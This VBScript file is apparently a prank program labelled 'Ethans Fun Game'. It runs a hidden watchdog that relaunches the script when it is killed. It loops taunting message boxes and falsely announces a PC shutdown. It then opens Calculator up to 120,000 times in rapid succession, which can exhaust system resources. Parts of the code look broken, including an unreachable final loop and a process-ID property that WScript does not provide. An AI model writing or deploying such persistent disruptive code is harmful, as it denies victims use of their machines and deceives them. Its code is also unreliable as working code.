Option Explicit

Dim objShell, scriptPath, closeCounter, isWatchdog, parentPid, annoyingAppPath

Set objShell = CreateObject("WScript.Shell")
scriptPath = WScript.ScriptFullName
isWatchdog = False
annoyingAppPath = "calc.exe" ' Path to the annoying application (Calculator)

' Check if the script was launched as a "watchdog" process
If WScript.Arguments.Named.Exists("parentPid") Then
    parentPid = WScript.Arguments.Named("parentPid")
    isWatchdog = True
Else
    ' Start the watchdog process
    objShell.Run "wscript.exe """ & scriptPath & """ /parentPid:" & GetCurrentProcessID(), 0, False
End If

If isWatchdog Then
    ' Watchdog loop to relaunch the script if the parent process is terminated
    Do
        If Not IsProcessRunning(parentPid) Then
            objShell.Run "wscript.exe """ & scriptPath & """", 0, False
            WScript.Quit
        End If
        WScript.Sleep 5000 ' Check every 5 seconds
    Loop
Else
    ' Main script logic
    closeCounter = 0
    
    ' Main loop of the script
    Do
        closeCounter = closeCounter + 1
        
        If closeCounter >= 15 Then
            MsgBox "'_'", vbYesNo, "'_'"
            LaunchAnnoyingApp
        ElseIf closeCounter >= 7 Then
            MsgBox "I'm still watching...", vbExclamation, "Warning"
        Else
            MsgBox "                                                             '_'                                                                                                        I'm always watching...", vbOKOnly, "Ethans Fun Game"
        End If
    Loop
    
    ' Additional loop after the 50th closure
    Do
        MsgBox "You can't escape me now! I'm still here...", vbOKOnly, "I'm here..."
    Loop
End If

' Function to get the current process ID
Function GetCurrentProcessID()
    Dim fso, file, pidFile
    Set fso = CreateObject("Scripting.FileSystemObject")
    pidFile = fso.GetSpecialFolder(2) & "\pid.txt"
    On Error Resume Next
    Set file = fso.CreateTextFile(pidFile, True)
    file.WriteLine WScript.ProcessID
    file.Close
    GetCurrentProcessID = WScript.ProcessID
    On Error GoTo 0
End Function

' Function to check if a process is running by its PID
Function IsProcessRunning(PID)
    Dim fso, file, fileContent
    Set fso = CreateObject("Scripting.FileSystemObject")
    On Error Resume Next
    fileContent = fso.OpenTextFile(fso.GetSpecialFolder(2) & "\pid.txt", 1).ReadAll
    IsProcessRunning = (fileContent = PID)
    On Error GoTo 0
End Function

' Function to launch an annoying application repeatedly and quickly
Sub LaunchAnnoyingApp()
    Dim i
    MsgBox "Shutting Down Your PC ;)", vbExclamation, "Warning"
    For i = 1 To 120000 ' Launch the app 120000 times
        objShell.Run annoyingAppPath, 1, False
        WScript.Sleep 100 ' Wait 0.1 second between launches
    Next
End Sub
